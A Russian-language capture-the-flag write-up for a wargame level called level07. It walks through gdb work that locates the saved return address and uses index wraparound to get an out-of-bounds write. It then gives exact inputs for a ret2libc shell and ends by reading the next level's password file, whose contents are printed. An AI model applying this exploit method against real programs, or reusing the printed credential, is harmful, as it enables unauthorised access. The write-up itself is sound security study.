RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level07/level07

Partial RELRO  - есть защита от перемещения
canary found- есть канареечная защита
NX disabled стек может содержать инструкции
No PIE - нет рандомизации базового адреса
No RPATH  - нет жестких путей загрузки библиотек
No RUNPATH - нет жестких путей загрузки библиотек

./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
-------------------------------------------------

после дисасемблирования можно сказать что размер таблицы

unsigned int	uint_tab[100];

чтение команд происходит  в
char			rd[20];

Забавный момент - мы можем выйти за границы памяти
Input command: store
 Number: 42
 Index: 161
 Completed store command successfully

 Input command: store
 Number: 2
 Index: -2
 Completed store command successfully

 Input command: read
 Index: -2
 Number at data[4294967294] is 2
 Completed read command successfully

Команда quit не требует пояснений,
 команда store считывает индекс и число и сохраняет это число в буфере по заданному индексу,
 команда read читает буфер по заданному индексу.

Когда мы вводим индекс, который делится на 3, мы получаем сообщение об ошибке:

Input command: store
 Number: 42
 Index: 21
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command

 Бинарный файл стирает переданные аргументы,
  а также среду, но оставляет нам исполняемый стек.

Мы можем использовать отсутствие связанных проверок в store_number,
чтобы переписать адрес возврата функции с помощью ret2libc.

Покажем, что массив интовый:

Input command: store
 Number: 65536
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 65536
 Completed read command successfully

Input command: store
 Number: 4294967296
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 4294967295 --> обрезается переполнение UNSIGHN MAX INT
 Completed read command successfully

с помощью gdb мы можем найти eip, сохраненный во время вызова main:

>> gdb -q ./level07
Reading symbols from /home/users/level07/level07...(no debugging symbols found)...done.
>> b *main
Breakpoint 1 at 0x8048723
>> r
Starting program: /home/users/level07/level07

Breakpoint 1, 0x08048723 in main ()
>> i f
Stack level 0, frame at 0xffffd710:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd710
 Saved registers:
  eip at 0xffffd70c <--- EIP

Теперь нам нужно найти адрес массива, чтобы получить индекс,
который мы будем использовать для перезаписи eip

Нужно найти позицию в массиве, относительно которой сможем переписать ЕИП

Dump of assembler code for function read_number:
   0x080486d7 <+0>:     push   %ebp
   0x080486d8 <+1>:     mov    %esp,%ebp
   0x080486da <+3>:     sub    $0x28,%esp
   0x080486dd <+6>:     movl   $0x0,-0xc(%ebp) <--- присваивание 0 input

ставим бреак поинт на read_number:

(gdb) b read_number
(gdb) r

(gdb) i f
Stack level 0, frame at 0xffffd520:
 eip = 0x80486dd in read_number; saved eip 0x8048930
 called by frame at 0xffffd710
 Arglist at 0xffffd518, args:
 Locals at 0xffffd518, Previous frame's sp is 0xffffd520 <-- аргумент который мы передали

(gdb) x 0xffffd520
0xffffd520:     0xffffd544

EBP хранит адрес дна текущего стека функций.
В качестве базового адреса обычно используется низ стека.
Мы можем получить адрес переменной, сложив и вычтя адрес дна стека и смещение (очень важно).

(gdb) p 0xffffd70c - 0xffffd544
$3 = 456
(gdb) p 456 / 4
$4 = 114 <-- те обратившись к массиву по индексу 114 мы начнем работать с ЕИПом
(gdb)


проверим смещение 114:

Breakpoint 1, 0x080486dd in read_number ()
(gdb) c
Continuing.
 Index: 114
 Number at data[114] is 4158936339  <-- eip ?
 Completed read command successfully
(gdb) p/x 4158936339
$10 = 0xf7e45513
(gdb) x 0xf7e45513
0xf7e45513 <__libc_start_main+243>:     0xe8240489 <--- совсем не ЕИП ((

Следовательно есть смещение при записи и чтении таблицы:

в конце функции read_number:
  0x080486fc <+37>:    shl    $0x2,%eax

в конце функции store_number:

// <+149>:   shl    eax,0x2
database[index << 2] = nbr;

Сдвиг на 2 эквивалентен умножению данного индекса на 4,
 это позволяет нам переполнить массив, обернуть беззнаковое int и вставить значение в индекс 114:

 (UINT_MAX / 4) - учли побитовый сдвиг на 2
 +114
Итак, возьмем (UINT_MAX / 4) + 114 либо 4294967296 / 4 + 114 = 1,073,741,938

Давай попробуем уронить программу:

Input command: store
 Number: 3735928559
 Index: 1073741938
 Completed store command successfully
Input command: quit <--- чтобы сработал EIP

Program received signal SIGSEGV, Segmentation fault.
0xdeadbeef in ?? () <--УРА


Теперь запишем последовательно байты, вызывающие баш

воспользуемся атакой ret2libc:

1. Мы знаем, что eip 0xffffd70c хранится по индексу + 114 1073741938,
именно туда мы запишем адрес системного вызова system.
2. Индекс + 116 должен содержать нашу строку /bin/sh

Найдем эти адреса:

(gdb) info function system
All functions matching regular expression "system":

Non-debugging symbols:
0xf7e6aed0  system

(gdb) p 0xf7e6aed0
$6 = 4159090384 <-- dec


(gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
0xf7f897ec
1 pattern found.
(gdb) p 0xf7f897ec
$7 = 4160264172


./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
[...]


 Input command: store
 Number: 4159090384 <--- system()
 Index: 1073741938 <--- EIP
 Completed store command successfully
Input command: store
 Number: 4160264172 <--- "/bin/sh"
 Index:  116  
 Completed store command successfully
Input command: quit
$ whoami
level08
cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
